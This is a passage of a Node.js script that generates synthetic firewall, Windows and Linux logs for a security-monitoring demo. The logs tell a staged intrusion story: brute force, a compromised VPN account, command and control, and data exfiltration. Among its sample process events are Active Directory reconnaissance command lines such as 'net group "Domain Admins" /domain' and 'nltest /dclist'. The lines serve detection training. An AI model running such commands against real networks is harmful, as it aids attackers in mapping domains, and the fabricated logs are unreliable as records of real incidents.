#!/usr/bin/env node
/**
 * ══════════════════════════════════════════════════════════════════
 *  Elastic Security Demo — Consolidated Synthetic Log Generator
 * ══════════════════════════════════════════════════════════════════
 *
 *  Generates ALL synthetic logs for the "Operation Silent Pivot" demo
 *  plus a hidden "Quiet Insider" subplot for AI Threat Hunting Agent discovery:
 *
 *    Palo Alto PAN-OS:  Traffic, Threat, GlobalProtect, Authentication,
 *                       UserID, Decryption, System
 *    Windows Security:  Event IDs 4624, 4625, 4648, 4672, 4688, 4698, 4720, 4776
 *    Windows Sysmon:    Event IDs 1, 3, 7, 11, 13, 22
 *    Linux Auth/Audit:  SSH login, sudo, cron, auditd process exec
 *
 *  Output: One NDJSON file per category (pa, windows, linux) + a combined file.
 *
 *  Usage:
 *    node generate_all_demo_logs.js                # generate all
 *    node generate_all_demo_logs.js --pa-only      # PA logs only
 *    node generate_all_demo_logs.js --windows-only # Windows logs only
 *    node generate_all_demo_logs.js --linux-only   # Linux logs only
 *    node generate_all_demo_logs.js --attack-only  # attack-story events only
 *
 *  Prerequisites: Node.js 18+
 * ══════════════════════════════════════════════════════════════════
 */

const fs = require("fs");
const path = require("path");

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════
const CONFIG = {
  // Background noise volumes (normal day-to-day traffic)
  background: {
    pa_traffic:      4000,
    pa_threat:        300,
    pa_system:        200,
    pa_globalprotect: 150,
    pa_auth:          200,
    pa_userid:        120,
    pa_decryption:     80,
    win_security:    1500,
    win_sysmon:      1000,
    linux_auth:       600,
  },
  // Attack story adds a focused set of events on top of background
  daysBack: 14,        // total timespan for background noise
  attackDaysBack: 3,   // the attack unfolds over the last 3 days
  ecsVersion: "8.11.0",
  tag: "elastic-security-demo-data",
};

const NOW = Date.now();
const MS_PER_DAY  = 86400000;
const MS_PER_HOUR = 3600000;

// Attack timeline: T=0 is when brute-force starts (3 days ago)
const ATTACK_T0 = NOW - (CONFIG.attackDaysBack * MS_PER_DAY);

// ═══════════════════════════════════════════════════════════════
// SHARED UTILITIES
// ═══════════════════════════════════════════════════════════════
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function weightedPick(arr, weights) {
  const total = weights.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < arr.length; i++) { r -= weights[i]; if (r <= 0) return arr[i]; }
  return arr[arr.length - 1];
}
function uuid() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === "x" ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

// Random timestamp within the full background window
function bgTimestamp() {
  return new Date(NOW - Math.random() * CONFIG.daysBack * MS_PER_DAY).toISOString();
}

// Attack-relative timestamp: offset in hours from T0
function attackTs(hoursOffset, jitterMinutes = 15) {
  const base = ATTACK_T0 + hoursOffset * MS_PER_HOUR;
  const jitter = (Math.random() - 0.5) * 2 * jitterMinutes * 60000;
  return new Date(base + jitter).toISOString();
}

function randomInternalIP() { return pick(NET.INTERNAL_SUBNETS) + "." + randomInt(10, 254); }
function randomMAC() {
  return Array.from({ length: 6 }, () => randomInt(0, 255).toString(16).padStart(2, "0")).join(":");
}

// ═══════════════════════════════════════════════════════════════
// NETWORK TOPOLOGY & IDENTITY (shared across all generators)
// ═══════════════════════════════════════════════════════════════
const NET = {
  INTERNAL_SUBNETS: ["10.1.10", "10.1.20", "10.1.30", "10.2.10", "192.168.1"],
  DMZ_IPS: ["10.100.1.10", "10.100.1.11", "10.100.1.20"],
  VPN_SUBNET: "10.5.0",   // GlobalProtect VPN pool
  DC_IP: "10.1.10.5",
  FILE_SERVER_IP: "10.1.10.20",
  LINUX_SERVER_IP: "10.2.10.50",
  LINUX_HOSTNAME: "SRV-LINUX01",
  DC_HOSTNAME: "SRV-DC01",
};

// External IPs with geo info
const EXTERNAL_HOSTS = [
  { ip: "203.0.113.50",   country: "China",         city: "Beijing",       lat: 39.9042,  lon: 116.4074, cc: "CN" },
  { ip: "198.51.100.22",  country: "United States",  city: "Ashburn",       lat: 39.0438,  lon: -77.4874, cc: "US" },
  { ip: "185.220.101.35", country: "Germany",        city: "Frankfurt",     lat: 50.1109,  lon: 8.6821,   cc: "DE" },
  { ip: "91.234.56.78",   country: "Russia",         city: "Moscow",        lat: 55.7558,  lon: 37.6173,  cc: "RU" },
  { ip: "45.33.32.156",   country: "United States",  city: "Fremont",       lat: 37.5483,  lon: -121.9886,cc: "US" },
  { ip: "104.21.45.67",   country: "United States",  city: "San Francisco", lat: 37.7749,  lon: -122.4194,cc: "US" },
  { ip: "172.67.183.22",  country: "United States",  city: "San Francisco", lat: 37.7749,  lon: -122.4194,cc: "US" },
  { ip: "151.101.1.140",  country: "United States",  city: "New York",      lat: 40.7128,  lon: -74.006,  cc: "US" },
  { ip: "13.107.42.14",   country: "United States",  city: "Redmond",       lat: 47.674,   lon: -122.1215,cc: "US" },
  { ip: "142.250.80.46",  country: "United States",  city: "Mountain View", lat: 37.386,   lon: -122.0838,cc: "US" },
  { ip: "31.13.72.36",    country: "Ireland",        city: "Dublin",        lat: 53.3498,  lon: -6.2603,  cc: "IE" },
  { ip: "103.224.182.250",country: "Australia",       city: "Sydney",        lat: -33.8688, lon: 151.2093, cc: "AU" },
  { ip: "177.71.244.10",  country: "Brazil",         city: "São Paulo",     lat: -23.5505, lon: -46.6333, cc: "BR" },
  { ip: "112.175.88.200", country: "South Korea",    city: "Seoul",         lat: 37.5665,  lon: 126.978,  cc: "KR" },
];

// Attacker and malicious IPs
const MALICIOUS_IPS = [
  { ip: "185.220.101.35", country: "Germany",     city: "Frankfurt",  lat: 50.1109,  lon: 8.6821,  cc: "DE", note: "Tor exit node" },
  { ip: "91.234.56.78",   country: "Russia",      city: "Moscow",     lat: 55.7558,  lon: 37.6173, cc: "RU", note: "Known C2" },
  { ip: "5.188.210.12",   country: "Russia",      city: "St Petersburg",lat: 59.9343, lon: 30.3351, cc: "RU", note: "Brute-force farm" },
  { ip: "45.155.205.233", country: "Romania",     city: "Bucharest",  lat: 44.4268,  lon: 26.1025, cc: "RO", note: "Scanning host" },
  { ip: "89.248.167.131", country: "Netherlands", city: "Amsterdam",  lat: 52.3676,  lon: 4.9041,  cc: "NL", note: "Bulletproof hosting" },
  { ip: "61.177.172.55",  country: "China",       city: "Nanjing",    lat: 32.0603,  lon: 118.7969,cc: "CN", note: "APT staging" },
  { ip: "218.92.0.190",   country: "China",       city: "Jiangsu",    lat: 32.0617,  lon: 118.7778,cc: "CN", note: "Data exfil dest" },
];

// THE ATTACKER — consistent identity through the attack story
const ATTACKER = {
  sourceIP:        "45.155.205.233",   // Romanian bulletproof hosting
  sourceGeo:       { country: "Romania", city: "Bucharest", lat: 44.4268, lon: 26.1025, cc: "RO" },
  vpnAssignedIP:   "10.5.0.99",        // IP assigned by GlobalProtect
  compromisedUser: "rjohnson",          // the contractor account
  targetUser:      "admin.ops",         // privilege escalation target
  c2Server:        { ip: "91.234.56.78", country: "Russia", city: "Moscow", lat: 55.7558, lon: 37.6173, cc: "RU" },
  exfilDest:       { ip: "218.92.0.190", country: "China",  city: "Jiangsu", lat: 32.0617, lon: 118.7778, cc: "CN" },
};

const HOSTNAMES = [
  "WS-PC001", "WS-PC002", "WS-PC003", "WS-PC004", "WS-PC005",
  "WS-PC006", "WS-PC007", "SRV-DC01", "SRV-FILE01",
  "SRV-WEB01", "SRV-DB01", "SRV-APP01", "SRV-MAIL01"
];

const USERS = [
  "jsmith", "mwilson", "rjohnson", "alee", "kpatel",
  "dgarcia", "tchen", "bkim", "lnguyen", "svc_backup",
  "svc_monitoring", "admin.ops"
];

const PA_ZONES = { internal: "trust", dmz: "dmz", external: "untrust", vpn: "vpn-zone" };

const APPLICATIONS = [
  "web-browsing", "ssl", "dns", "ms-update", "office365-enterprise-access",
  "google-base", "youtube-base", "github", "smtp", "imap",
  "ssh", "rdp", "smb", "ntp", "ldap",
  "ms-ds-smb", "netbios-ns", "kerberos", "active-directory",
  "icmp", "ping", "syslog", "snmp", "ftp",
  "python-urllib", "curl", "bittorrent", "tor", "unknown-tcp", "unknown-udp"
];

const COMMON_PORTS = [80, 443, 53, 22, 25, 110, 143, 993, 445, 3389, 389, 636, 88, 123, 161, 514, 8080, 8443];

const PA_RULE_NAMES = [
  "Allow-Outbound-Web", "Allow-DNS", "Allow-Office365", "Allow-MS-Updates",
  "Allow-Internal-Servers", "Allow-DMZ-Services", "Allow-VPN-Access",
  "Deny-Tor-Exit", "Deny-Bittorrent", "Deny-Known-Malicious",
  "Block-SSH-External", "Block-RDP-External", "Block-SMB-External",
  "Default-Deny", "Allow-ICMP-Internal"
];

const THREAT_NAMES = [
  "Microsoft Windows SMB Remote Code Execution Vulnerability",
  "Apache Log4j Remote Code Execution Vulnerability",
  "HTTP SQL Injection Attempt",
  "PowerShell Empire Stager Detection",
  "Cobalt Strike Beacon Detected",
  "Mimikatz Activity Detected",
  "Suspicious DNS Query (DGA Pattern)",
  "TLS/SSL Heartbleed Attack",
  "Brute Force Login Attempt",
  "Suspicious User-Agent String",
  "Cryptocurrency Mining Pool Connection",
  "Known Malware Command and Control",
  "DNS Tunneling Detected",
  "ICMP Tunnel Detected",
  "Suspicious Encoded PowerShell",
];

// ═══════════════════════════════════════════════════════════════
//  PART 1: PALO ALTO PAN-OS LOG GENERATORS
// ═══════════════════════════════════════════════════════════════

// --- PA: Observer block (shared) ---
function paObserver() {
  return {
    vendor: "Palo Alto Networks",
    product: "PAN-OS",
    type: "firewall",
    hostname: "PA-3260-01",
    serial_number: "012345678901",
    version: "11.1.2"
  };
}

// --- PA TRAFFIC (background) ---
function generatePATraffic() {
  const isOutbound = Math.random() < 0.75;
  let srcIP, dstIP, srcZone, dstZone, natSrcIP, dstGeo, srcGeo;

  if (isOutbound) {
    srcIP = randomInternalIP();
    const dstHost = pick(EXTERNAL_HOSTS);
    dstIP = dstHost.ip;
    srcZone = PA_ZONES.internal; dstZone = PA_ZONES.external;
    natSrcIP = "203.0.113.1";
    dstGeo = { country_name: dstHost.country, country_iso_code: dstHost.cc, city_name: dstHost.city, location: { lat: dstHost.lat, lon: dstHost.lon } };
  } else {
    const ext = pick([...EXTERNAL_HOSTS, ...MALICIOUS_IPS]);
    srcIP = ext.ip; dstIP = Math.random() < 0.5 ? randomInternalIP() : pick(NET.DMZ_IPS);
    srcZone = PA_ZONES.external; dstZone = Math.random() < 0.5 ? PA_ZONES.internal : PA_ZONES.dmz;
    srcGeo = { country_name: ext.country, country_iso_code: ext.cc, city_name: ext.city, location: { lat: ext.lat, lon: ext.lon } };
  }

  const dstPort = pick(COMMON_PORTS);
  const app = pick(APPLICATIONS);
  const isSuspicious = ["bittorrent", "tor", "unknown-tcp"].includes(app) || MALICIOUS_IPS.some(m => m.ip === srcIP || m.ip === dstIP);
  const action = isSuspicious ? pick(["deny", "drop", "reset-both"]) : weightedPick(["allow", "deny", "drop"], [85, 10, 5]);
  const bytesSent = action === "allow" ? randomInt(100, 500000) : randomInt(0, 200);
  const bytesRecv = action === "allow" ? randomInt(200, 2000000) : 0;
  const user = Math.random() < 0.6 ? pick(USERS) : null;

  const doc = {
    "@timestamp": bgTimestamp(),
    event: {
      kind: "event", category: ["network"],
      type: action === "allow" ? ["connection", "allowed"] : ["connection", "denied"],
      action, outcome: action === "allow" ? "success" : "failure",
      module: "panw", dataset: "panw.panos",
      duration: (action === "allow" ? randomInt(1, 3600) : randomInt(0, 5)) * 1e9
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: action === "allow" ? "informational" : "warning" },
    rule: { name: action === "allow" ? pick(PA_RULE_NAMES.filter(r => r.startsWith("Allow"))) : pick(PA_RULE_NAMES.filter(r => !r.startsWith("Allow"))) },
    network: {
      transport: dstPort === 53 ? "udp" : "tcp",
      application: app, bytes: bytesSent + bytesRecv,
      packets: Math.ceil(bytesSent / 1000) + Math.ceil(bytesRecv / 1000),
      direction: isOutbound ? "outbound" : "inbound"
    },
    source: { ip: srcIP, port: randomInt(1024, 65535), bytes: bytesSent },
    destination: { ip: dstIP, port: dstPort, bytes: bytesRecv },
    panw: { panos: {
      source: { zone: srcZone }, destination: { zone: dstZone },
      type: "TRAFFIC", sub_type: action === "allow" ? "end" : "deny",
      action, session_id: String(randomInt(100000, 9999999)),
      repeat_count: 1, virtual_sys: "vsys1"
    }},
    host: { name: pick(HOSTNAMES) },
    ecs: { version: CONFIG.ecsVersion }
  };

  if (srcGeo) doc.source.geo = srcGeo;
  if (dstGeo) doc.destination.geo = dstGeo;
  if (user) { doc.source.user = { name: user }; doc.user = { name: user }; }
  if (natSrcIP) doc.source.nat = { ip: natSrcIP, port: randomInt(1024, 65535) };
  return doc;
}

// --- PA THREAT (background) ---
function generatePAThreat() {
  const srcIP = randomInternalIP();
  const dstHost = pick([...MALICIOUS_IPS, ...EXTERNAL_HOSTS.slice(0, 5)]);
  const severity = pick(["critical", "high", "high", "medium", "medium", "low"]);
  const action = pick(["alert", "drop", "reset-both", "block-url"]);
  const subType = weightedPick(["vulnerability", "spyware", "virus", "wildfire"], [40, 30, 15, 15]);
  const threatName = pick(THREAT_NAMES);
  const user = pick(USERS);

  return {
    "@timestamp": bgTimestamp(),
    event: {
      kind: "alert", category: ["intrusion_detection", "network"], type: ["info"],
      action, outcome: action === "alert" ? "success" : "failure",
      severity: severity === "critical" ? 1 : severity === "high" ? 2 : severity === "medium" ? 3 : 4,
      module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: severity },
    rule: { name: "Threat-Protection-Strict" },
    threat: { indicator: { name: threatName } },
    network: { transport: "tcp", application: pick(["web-browsing", "ssl", "ssh", "smb", "dns"]), direction: "outbound" },
    source: { ip: srcIP, port: randomInt(1024, 65535), user: { name: user } },
    destination: {
      ip: dstHost.ip, port: pick([80, 443, 8080, 445, 22, 53]),
      geo: { country_name: dstHost.country, country_iso_code: dstHost.cc, city_name: dstHost.city, location: { lat: dstHost.lat, lon: dstHost.lon } }
    },
    user: { name: user },
    host: { name: pick(HOSTNAMES) },
    panw: { panos: {
      source: { zone: "trust" }, destination: { zone: "untrust" },
      type: "THREAT", sub_type: subType, action,
      threat: { name: threatName, id: String(randomInt(30000, 99999)) },
      severity, session_id: String(randomInt(100000, 9999999)), virtual_sys: "vsys1"
    }},
    ecs: { version: CONFIG.ecsVersion }
  };
}

// --- PA GLOBALPROTECT (background + attack) ---
function generatePAGlobalProtect(opts = {}) {
  const isAttack = opts.attack || false;
  const user    = isAttack ? ATTACKER.compromisedUser : pick(USERS.filter(u => !u.startsWith("svc_")));
  const srcIP   = isAttack ? ATTACKER.sourceIP : `${randomInt(50, 220)}.${randomInt(1, 254)}.${randomInt(1, 254)}.${randomInt(1, 254)}`;
  const vpnIP   = isAttack ? ATTACKER.vpnAssignedIP : `${NET.VPN_SUBNET}.${randomInt(10, 98)}`;
  const status  = isAttack ? (opts.status || "connected") : pick(["connected", "connected", "connected", "disconnected"]);
  const ts      = isAttack ? opts.ts : bgTimestamp();
  const srcGeo  = isAttack ? ATTACKER.sourceGeo : pick(EXTERNAL_HOSTS);

  const stage = status === "connected" ? "login" : "logout";
  const loginType = pick(["SAML", "LDAP", "Certificate", "RADIUS"]);

  return {
    "@timestamp": ts,
    event: {
      kind: "event",
      category: ["authentication", "network"],
      type: status === "connected" ? ["start", "allowed"] : ["end"],
      action: `globalprotect-${stage}`,
      outcome: "success",
      module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: "informational" },
    message: `GlobalProtect gateway ${stage}: user ${user} from ${srcIP}, assigned IP ${vpnIP}, auth: ${loginType}`,
    user: { name: user },
    source: {
      ip: srcIP,
      geo: { country_name: srcGeo.country || srcGeo.country_name, country_iso_code: srcGeo.cc || srcGeo.country_iso_code, city_name: srcGeo.city || srcGeo.city_name, location: { lat: srcGeo.lat, lon: srcGeo.lon } }
    },
    network: { application: "globalprotect" },
    panw: { panos: {
      type: "SYSTEM", sub_type: "globalprotect",
      action: stage,
      virtual_sys: "vsys1",
      globalprotect: {
        client_ip: srcIP,
        assigned_ip: vpnIP,
        login_type: loginType,
        stage,
        status: status === "connected" ? "success" : "logout",
        portal: "GP-Portal-01",
        gateway: "GP-GW-01",
        client_os: isAttack ? "Windows 10.0" : pick(["Windows 10.0", "Windows 11.0", "macOS 14.2", "macOS 13.5"]),
        client_version: "6.2.1-120",
        hostname: isAttack ? "CONTRACTOR-PC" : pick(HOSTNAMES),
      }
    }},
    host: { name: "PA-3260-01" },
    ecs: { version: CONFIG.ecsVersion }
  };
}

// --- PA AUTHENTICATION (background + attack brute-force) ---
function generatePAAuth(opts = {}) {
  const isAttack = opts.attack || false;
  const user     = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);
  const srcIP    = isAttack ? ATTACKER.sourceIP : randomInternalIP();
  const outcome  = isAttack ? (opts.outcome || "failure") : weightedPick(["success", "failure"], [90, 10]);
  const ts       = isAttack ? opts.ts : bgTimestamp();
  const authType = pick(["RADIUS", "LDAP", "LOCAL", "SAML"]);

  return {
    "@timestamp": ts,
    event: {
      kind: "event",
      category: ["authentication"],
      type: outcome === "success" ? ["start", "allowed"] : ["start", "denied"],
      action: "firewall-authentication",
      outcome,
      module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: outcome === "success" ? "informational" : "warning" },
    message: `Authentication ${outcome} for user '${user}' via ${authType} from ${srcIP}`,
    user: { name: user },
    source: { ip: srcIP },
    panw: { panos: {
      type: "SYSTEM", sub_type: "auth",
      action: outcome === "success" ? "auth-success" : "auth-fail",
      virtual_sys: "vsys1",
      auth: {
        policy: "GP-Auth-Policy",
        server_profile: authType === "RADIUS" ? "Corp-RADIUS" : authType === "LDAP" ? "Corp-LDAP" : "Local-DB",
        method: authType,
        description: outcome === "failure" ? "Invalid credentials" : "User authenticated"
      }
    }},
    host: { name: "PA-3260-01" },
    ecs: { version: CONFIG.ecsVersion }
  };
}

// --- PA USERID (background + attack) ---
function generatePAUserID(opts = {}) {
  const isAttack = opts.attack || false;
  const user     = isAttack ? ATTACKER.compromisedUser : pick(USERS);
  const ip       = isAttack ? ATTACKER.vpnAssignedIP : randomInternalIP();
  const ts       = isAttack ? opts.ts : bgTimestamp();
  const action   = pick(["login", "login", "login", "logout"]);

  return {
    "@timestamp": ts,
    event: {
      kind: "event",
      category: ["authentication", "iam"],
      type: action === "login" ? ["user", "start"] : ["user", "end"],
      action: `user-id-${action}`,
      outcome: "success",
      module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: "informational" },
    message: `User-ID ${action}: ${user} mapped to ${ip}`,
    user: { name: user, domain: "CORP" },
    source: { ip },
    panw: { panos: {
      type: "USERID", sub_type: action,
      action: `user-id-${action}`,
      virtual_sys: "vsys1",
      user_id: {
        ip, user,
        source_type: pick(["AD-Agent", "GlobalProtect", "Syslog-Sender", "TS-Agent"]),
        timeout: randomInt(300, 3600)
      }
    }},
    host: { name: "PA-3260-01" },
    ecs: { version: CONFIG.ecsVersion }
  };
}

// --- PA DECRYPTION (background + attack) ---
function generatePADecryption(opts = {}) {
  const isAttack = opts.attack || false;
  const srcIP = isAttack ? ATTACKER.vpnAssignedIP : randomInternalIP();
  const dstHost = isAttack ? ATTACKER.exfilDest : pick(EXTERNAL_HOSTS);
  const ts = isAttack ? opts.ts : bgTimestamp();
  const user = isAttack ? ATTACKER.compromisedUser : pick(USERS);
  const policyAction = isAttack ? "decrypt" : pick(["decrypt", "decrypt", "no-decrypt"]);

  return {
    "@timestamp": ts,
    event: {
      kind: "event",
      category: ["network"],
      type: ["info"],
      action: `ssl-${policyAction}`,
      outcome: "success",
      module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: "informational" },
    message: `SSL ${policyAction}: ${srcIP} -> ${dstHost.ip}:443, TLS 1.2, SNI: ${isAttack ? "cdn-storage.example.cn" : pick(["www.google.com", "outlook.office365.com", "github.com"])}`,
    user: { name: user },
    source: { ip: srcIP, port: randomInt(1024, 65535) },
    destination: {
      ip: dstHost.ip, port: 443,
      geo: { country_name: dstHost.country, country_iso_code: dstHost.cc, city_name: dstHost.city, location: { lat: dstHost.lat, lon: dstHost.lon } }
    },
    tls: {
      version: pick(["1.2", "1.3"]),
      cipher: pick(["TLS_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"]),
      server: { subject: isAttack ? "CN=cdn-storage.example.cn" : pick(["CN=*.google.com", "CN=outlook.com"]) }
    },
    panw: { panos: {
      type: "DECRYPTION", sub_type: policyAction,
      action: policyAction, virtual_sys: "vsys1",
      session_id: String(randomInt(100000, 9999999)),
      decryption: {
        policy: "Corp-Decrypt-Policy",
        elliptic_curve: "secp256r1"
      }
    }},
    host: { name: "PA-3260-01" },
    ecs: { version: CONFIG.ecsVersion }
  };
}

// --- PA SYSTEM (background) ---
function generatePASystem() {
  const events = [
    { subType: "general",       msg: "Configuration committed successfully by admin admin.ops" },
    { subType: "general",       msg: "HA peer state changed from active to passive" },
    { subType: "auth",          msg: "User admin.ops authenticated via RADIUS for Web UI access" },
    { subType: "auth",          msg: "User svc_monitoring authenticated via API key" },
    { subType: "auth",          msg: "Failed authentication attempt for user unknown_admin from 10.1.10.50" },
    { subType: "dhcp",          msg: "DHCP lease renewed for 10.1.20.105" },
    { subType: "general",       msg: "Threat signature update completed: version 8847-9012" },
    { subType: "general",       msg: "WildFire submission: file verdict malicious for SHA256 a1b2c3..." },
    { subType: "general",       msg: "High CPU utilization detected: dataplane at 87%" },
    { subType: "general",       msg: "Interface ethernet1/1 link state changed to up" },
    { subType: "general",       msg: "Auto-commit: content update 8847-9013 installed" },
  ];

  const evt = pick(events);
  const severity = evt.msg.includes("Failed") || evt.msg.includes("High CPU") ? "warning" : "informational";

  return {
    "@timestamp": bgTimestamp(),
    event: {
      kind: "event", category: ["host"], type: ["info"],
      action: evt.subType, module: "panw", dataset: "panw.panos"
    },
    data_stream: { type: "logs", dataset: "panw.panos", namespace: "default" },
    observer: paObserver(),
    tags: [CONFIG.tag],
    log: { level: severity },
    message: evt.msg,
    panw: { panos: { type: "SYSTEM", sub_type: evt.subType, virtual_sys: "vsys1" } },
    host: { name: "PA-3260-01" },
    ecs: { version: CONFIG.ecsVersion }
  };
}


// ═══════════════════════════════════════════════════════════════
//  PART 2: WINDOWS SECURITY EVENT LOG GENERATORS
// ═══════════════════════════════════════════════════════════════

function winBase(eventId, ts) {
  return {
    "@timestamp": ts || bgTimestamp(),
    data_stream: { type: "logs", dataset: "windows.security", namespace: "default" },
    tags: [CONFIG.tag],
    event: { module: "windows", dataset: "windows.security", provider: "Microsoft-Windows-Security-Auditing" },
    agent: { type: "winlogbeat", version: "8.17.0" },
    ecs: { version: CONFIG.ecsVersion },
    winlog: { api: "wineventlog", channel: "Security", event_id: String(eventId), provider_name: "Microsoft-Windows-Security-Auditing", computer_name: pick(HOSTNAMES) }
  };
}

// 4624 — Successful logon
function generateWin4624(opts = {}) {
  const isAttack = opts.attack || false;
  const ts   = opts.ts || bgTimestamp();
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);
  const srcIP = isAttack ? (opts.srcIP || ATTACKER.vpnAssignedIP) : randomInternalIP();
  const logonType = isAttack ? (opts.logonType || 3) : pick([2, 3, 7, 10, 11]);
  const hostname = opts.hostname || pick(HOSTNAMES);

  const doc = winBase(4624, ts);
  doc.event.kind = "event";
  doc.event.category = ["authentication"];
  doc.event.type = ["start", "allowed"];
  doc.event.action = "logged-in";
  doc.event.outcome = "success";
  doc.event.code = "4624";
  doc.message = `An account was successfully logged on. Subject: ${user} Logon Type: ${logonType}`;
  doc.user = { name: user, domain: "CORP", id: `S-1-5-21-${randomInt(1000000, 9999999)}-${randomInt(1000, 9999)}` };
  doc.source = { ip: srcIP, port: randomInt(1024, 65535) };
  doc.host = { name: hostname, os: { family: "windows", platform: "windows", name: "Windows 11 Enterprise", version: "10.0.22631" } };
  doc.winlog.event_data = {
    TargetUserName: user, TargetDomainName: "CORP",
    LogonType: String(logonType), IpAddress: srcIP, IpPort: String(randomInt(1024, 65535)),
    WorkstationName: hostname, LogonProcessName: logonType === 10 ? "User32" : "NtLmSsp",
    AuthenticationPackageName: "NTLM", LogonGuid: `{${uuid()}}`,
    TransmittedServices: "-", KeyLength: "128"
  };
  return doc;
}

// 4625 — Failed logon
function generateWin4625(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick([...USERS, "administrator", "admin", "root"]);
  const srcIP = isAttack ? (opts.srcIP || ATTACKER.vpnAssignedIP) : randomInternalIP();
  const hostname = opts.hostname || pick(HOSTNAMES);
  const failReason = pick(["%%2313", "%%2304", "%%2310"]); // Bad password, unknown user, account locked

  const doc = winBase(4625, ts);
  doc.event.kind = "event";
  doc.event.category = ["authentication"];
  doc.event.type = ["start", "denied"];
  doc.event.action = "logon-failed";
  doc.event.outcome = "failure";
  doc.event.code = "4625";
  doc.message = `An account failed to log on. Subject: ${user} Status: ${failReason}`;
  doc.user = { name: user, domain: "CORP" };
  doc.source = { ip: srcIP, port: randomInt(1024, 65535) };
  doc.host = { name: hostname, os: { family: "windows", platform: "windows" } };
  doc.winlog.event_data = {
    TargetUserName: user, TargetDomainName: "CORP",
    LogonType: "3", Status: "0xC000006D", SubStatus: failReason === "%%2313" ? "0xC000006A" : "0xC0000064",
    IpAddress: srcIP, IpPort: String(randomInt(1024, 65535)),
    WorkstationName: hostname, FailureReason: failReason
  };
  return doc;
}

// 4648 — Logon using explicit credentials (runas / pass-the-hash)
function generateWin4648(opts = {}) {
  const ts = opts.ts || bgTimestamp();
  const doc = winBase(4648, ts);
  doc.event.kind = "event";
  doc.event.category = ["authentication"];
  doc.event.type = ["start"];
  doc.event.action = "explicit-credential-logon";
  doc.event.outcome = "success";
  doc.event.code = "4648";

  const srcUser = opts.srcUser || ATTACKER.compromisedUser;
  const targetUser = opts.targetUser || ATTACKER.targetUser;
  const hostname = opts.hostname || "SRV-DC01";

  doc.message = `A logon was attempted using explicit credentials. Subject: ${srcUser} Target: ${targetUser}`;
  doc.user = { name: srcUser, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.winlog.event_data = {
    SubjectUserName: srcUser, SubjectDomainName: "CORP",
    TargetUserName: targetUser, TargetDomainName: "CORP",
    TargetServerName: hostname, ProcessName: "C:\\Windows\\System32\\svchost.exe"
  };
  return doc;
}

// 4672 — Special privileges assigned
function generateWin4672(opts = {}) {
  const ts = opts.ts || bgTimestamp();
  const user = opts.user || pick(["admin.ops", "svc_backup", ATTACKER.compromisedUser]);
  const hostname = opts.hostname || "SRV-DC01";

  const doc = winBase(4672, ts);
  doc.event.kind = "event";
  doc.event.category = ["iam"];
  doc.event.type = ["admin"];
  doc.event.action = "special-privilege-assigned";
  doc.event.outcome = "success";
  doc.event.code = "4672";
  doc.message = `Special privileges assigned to new logon: ${user}`;
  doc.user = { name: user, domain: "CORP" };
  doc.host = { name: hostname, os: { family: "windows" } };
  doc.winlog.event_data = {
    SubjectUserName: user, SubjectDomainName: "CORP",
    PrivilegeList: "SeDebugPrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege\n\t\tSeSecurityPrivilege"
  };
  return doc;
}

// 4688 — Process creation
function generateWin4688(opts = {}) {
  const isAttack = opts.attack || false;
  const ts = opts.ts || bgTimestamp();
  const hostname = opts.hostname || pick(HOSTNAMES);
  const user = isAttack ? (opts.user || ATTACKER.compromisedUser) : pick(USERS);

  const normalProcesses = [
    { name: "svchost.exe", path: "C:\\Windows\\System32\\svchost.exe", cmdline: "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", parent: "services.exe" },
    { name: "taskhostw.exe", path: "C:\\Windows\\System32\\taskhostw.exe", cmdline: "taskhostw.exe", parent: "svchost.exe" },
    { name: "RuntimeBroker.exe", path: "C:\\Windows\\System32\\RuntimeBroker.exe", cmdline: "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", parent: "svchost.exe" },
    { name: "chrome.exe", path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", cmdline: "chrome.exe --type=renderer", parent: "chrome.exe" },
    { name: "MsMpEng.exe", path: "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe", cmdline: "MsMpEng.exe", parent: "services.exe" },
  ];

  const attackProcesses = [
    { name: "cmd.exe", path: "C:\\Windows\\System32\\cmd.exe", cmdline: 'cmd.exe /c "net user /domain"', parent: "explorer.exe" },
    { name: "whoami.exe", path: "C:\\Windows\\System32\\whoami.exe", cmdline: "whoami.exe /all", parent: "cmd.exe" },
    { name: "nltest.exe", path: "C:\\Windows\\System32\\nltest.exe", cmdline: "nltest.exe /dclist:CORP", parent: "cmd.exe" },
    { name: "net.exe", path: "C:\\Windows\\System32\\net.exe", cmdline: "net.exe group \"Domain Admins\" /domain", parent: "cmd.exe" },
